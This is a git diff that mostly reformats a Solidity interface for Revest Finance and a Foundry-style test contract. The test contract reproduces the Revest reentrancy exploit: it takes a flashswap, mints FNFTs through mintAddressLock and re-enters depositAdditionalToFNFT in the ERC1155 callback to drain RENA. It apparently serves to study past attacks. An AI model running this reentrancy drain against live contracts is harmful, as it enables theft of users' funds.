@@ -16,78 +16,62 @@ interface IRevest {
     event FNFTTimeLockMinted(
         address indexed asset,
         address indexed from,
-        uint indexed fnftId,
-        uint endTime,
-        uint[] quantities,
+        uint256 indexed fnftId,
+        uint256 endTime,
+        uint256[] quantities,
         FNFTConfig fnftConfig
     );
 
     event FNFTValueLockMinted(
         address indexed primaryAsset,
         address indexed from,
-        uint indexed fnftId,
+        uint256 indexed fnftId,
         address compareTo,
         address oracleDispatch,
-        uint[] quantities,
+        uint256[] quantities,
         FNFTConfig fnftConfig
     );
 
     event FNFTAddressLockMinted(
         address indexed asset,
         address indexed from,
-        uint indexed fnftId,
+        uint256 indexed fnftId,
         address trigger,
-        uint[] quantities,
+        uint256[] quantities,
         FNFTConfig fnftConfig
     );
 
-    event FNFTWithdrawn(
-        address indexed from,
-        uint indexed fnftId,
-        uint indexed quantity
-    );
+    event FNFTWithdrawn(address indexed from, uint256 indexed fnftId, uint256 indexed quantity);
 
     event FNFTSplit(
-        address indexed from,
-        uint[] indexed newFNFTId,
-        uint[] indexed proportions,
-        uint quantity
+        address indexed from, uint256[] indexed newFNFTId, uint256[] indexed proportions, uint256 quantity
     );
 
-    event FNFTUnlocked(
-        address indexed from,
-        uint indexed fnftId
-    );
+    event FNFTUnlocked(address indexed from, uint256 indexed fnftId);
 
-    event FNFTMaturityExtended(
-        address indexed from,
-        uint indexed fnftId,
-        uint indexed newExtendedTime
-    );
+    event FNFTMaturityExtended(address indexed from, uint256 indexed fnftId, uint256 indexed newExtendedTime);
 
     event FNFTAddionalDeposited(
-        address indexed from,
-        uint indexed newFNFTId,
-        uint indexed quantity,
-        uint amount
+        address indexed from, uint256 indexed newFNFTId, uint256 indexed quantity, uint256 amount
     );
 
     struct FNFTConfig {
         address asset; // The token being stored
         address pipeToContract; // Indicates if FNFT will pipe to another contract
-        uint depositAmount; // How many tokens
-        uint depositMul; // Deposit multiplier
-        uint split; // Number of splits remaining
-        uint depositStopTime; //
-        bool maturityExtension; // Maturity extensions remaining
+        uint256 depositAmount; // How many tokens
+        uint256 depositMul; // Deposit multiplier
+        uint256 split; // Number of splits remaining
+        uint256 depositStopTime; //
+        bool maturityExtension;
+        // Maturity extensions remaining
         bool isMulti; //
         bool nontransferrable; // False by default (transferrable) //
     }
 
     // Refers to the global balance for an ERC20, encompassing possibly many FNFTs
     struct TokenTracker {
-        uint lastBalance;
-        uint lastMul;
+        uint256 lastBalance;
+        uint256 lastMul;
     }
 
     enum LockType {
@@ -99,7 +83,7 @@ interface IRevest {
 
     struct LockParam {
         address addressLock;
-        uint timeLockExpiry;
+        uint256 timeLockExpiry;
         LockType lockType;
         ValueLock valueLock;
     }
@@ -108,8 +92,8 @@ interface IRevest {
         address addressLock;
         LockType lockType;
         ValueLock valueLock;
-        uint timeLockExpiry;
-        uint creationTime;
+        uint256 timeLockExpiry;
+        uint256 creationTime;
         bool unlocked;
     }
 
@@ -117,61 +101,55 @@ interface IRevest {
         address asset;
         address compareTo;
         address oracle;
-        uint unlockValue;
+        uint256 unlockValue;
         bool unlockRisingEdge;
     }
 
     function mintTimeLock(
-        uint endTime,
+        uint256 endTime,
         address[] memory recipients,
-        uint[] memory quantities,
+        uint256[] memory quantities,
         IRevest.FNFTConfig memory fnftConfig
-    ) external payable returns (uint);
+    ) external payable returns (uint256);
 
     function mintValueLock(
         address primaryAsset,
         address compareTo,
-        uint unlockValue,
+        uint256 unlockValue,
         bool unlockRisingEdge,
         address oracleDispatch,
         address[] memory recipients,
-        uint[] memory quantities,
+        uint256[] memory quantities,
         IRevest.FNFTConfig memory fnftConfig
-    ) external payable returns (uint);
+    ) external payable returns (uint256);
 
     function mintAddressLock(
         address trigger,
         bytes memory arguments,
         address[] memory recipients,
-        uint[] memory quantities,
+        uint256[] memory quantities,
         IRevest.FNFTConfig memory fnftConfig
-    ) external payable returns (uint);
+    ) external payable returns (uint256);
 
-    function withdrawFNFT(uint tokenUID, uint quantity) external;
+    function withdrawFNFT(uint256 tokenUID, uint256 quantity) external;
 
-    function unlockFNFT(uint tokenUID) external;
+    function unlockFNFT(uint256 tokenUID) external;
 
-    function splitFNFT(
-        uint fnftId,
-        uint[] memory proportions,
-        uint quantity
-    ) external returns (uint[] memory newFNFTIds);
+    function splitFNFT(uint256 fnftId, uint256[] memory proportions, uint256 quantity)
+        external
+        returns (uint256[] memory newFNFTIds);
 
-    function depositAdditionalToFNFT(
-        uint fnftId,
-        uint amount,
-        uint quantity
-    ) external returns (uint);
+    function depositAdditionalToFNFT(uint256 fnftId, uint256 amount, uint256 quantity)
+        external
+        returns (uint256);
 
-    function setFlatWeiFee(uint wethFee) external;
+    function setFlatWeiFee(uint256 wethFee) external;
 
-    function setERC20Fee(uint erc20) external;
+    function setERC20Fee(uint256 erc20) external;
 
-    function getFlatWeiFee() external returns (uint);
+    function getFlatWeiFee() external returns (uint256);
 
-    function getERC20Fee() external returns (uint);
-
-
+    function getERC20Fee() external returns (uint256);
 }
 
 contract Exploit_RevestFinance is TestHarness {
@@ -187,7 +165,8 @@ contract Exploit_RevestFinance is TestHarness {
     uint256 currentId;
 
     function setUp() external {
-        cheat.createSelectFork("mainnet", 14465356); // We pin one block before the exploit happened.
+        cheat.createSelectFork(vm.envString("RPC_URL"), 14_465_356); // We pin one block before the exploit
+            // happened.
 
         cheat.label(attacker, "Attacker");
     }
@@ -202,15 +181,14 @@ contract Exploit_RevestFinance is TestHarness {
         rena.approve(address(revest), type(uint256).max);
 
         // 3: Flashswap Rena from pair by sending non-zero data.
-        renaWethPair.swap(2000000000000000000, 0,  address(this), abi.encode(0x78));
-
+        renaWethPair.swap(2_000_000_000_000_000_000, 0, address(this), abi.encode(0x78));
     }
 
-    function uniswapV2Call(address , uint amount0, uint , bytes calldata ) external  {
+    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
         require(address(renaWethPair) == msg.sender, "Only callable by pair");
         uint256 renaStartingBalnace = rena.balanceOf(address(this));
 
-          address[] memory _recipients = new address[](1);
+        address[] memory _recipients = new address[](1);
         _recipients[0] = address(this);
 
         uint256[] memory _quantities = new uint256[](1);
@@ -227,16 +205,15 @@ contract Exploit_RevestFinance is TestHarness {
         nftConfig.isMulti = true;
         nftConfig.nontransferrable = false;
 
-
         // 4. Calls mintAddressLock to get 2 NFTS in order to get the current NFT id
-        currentId = revest.mintAddressLock(address(this), new bytes(0) , _recipients, _quantities, nftConfig);
+        currentId = revest.mintAddressLock(address(this), new bytes(0), _recipients, _quantities, nftConfig);
 
         // 4. Calls mintAddressLock again
         _quantities[0] = 360_000;
-        revest.mintAddressLock(address(this), new bytes(0) , _recipients, _quantities, nftConfig);
+        revest.mintAddressLock(address(this), new bytes(0), _recipients, _quantities, nftConfig);
 
         // 5. Cashout the NFTs for RENA
-        revest.withdrawFNFT(currentId + 1, 360001);
+        revest.withdrawFNFT(currentId + 1, 360_001);
 
         rena.transfer(address(renaWethPair), ((((amount0 / 997) * 1000) / 99) * 100) + 1000);
 
@@ -246,19 +223,17 @@ contract Exploit_RevestFinance is TestHarness {
         rena.transfer(attacker, renaEndingBalance);
     }
 
-    function onERC1155Received(
-        address ,
-        address ,
-        uint256 id,
-        uint256 ,
-        bytes calldata 
-    ) public returns (bytes4) {
+    function onERC1155Received(address, address, uint256 id, uint256, bytes calldata)
+        public
+        returns (bytes4)
+    {
         // Checking that the current minted ID is the next one to ensure that we mint all the NFTs of that ID
-        if (id == currentId + 1 && (reentrancyStep == 0)) { // Using a reentrancyStep as a number allows us to perform different logics depending on the current callback step.
+        if (id == currentId + 1 && (reentrancyStep == 0)) {
+            // Using a reentrancyStep as a number allows us to perform different logics depending on the
+                // current callback step.
             reentrancyStep++;
             revest.depositAdditionalToFNFT(currentId, 1e18, 1);
         }
         return this.onERC1155Received.selector;
     }
-
 }
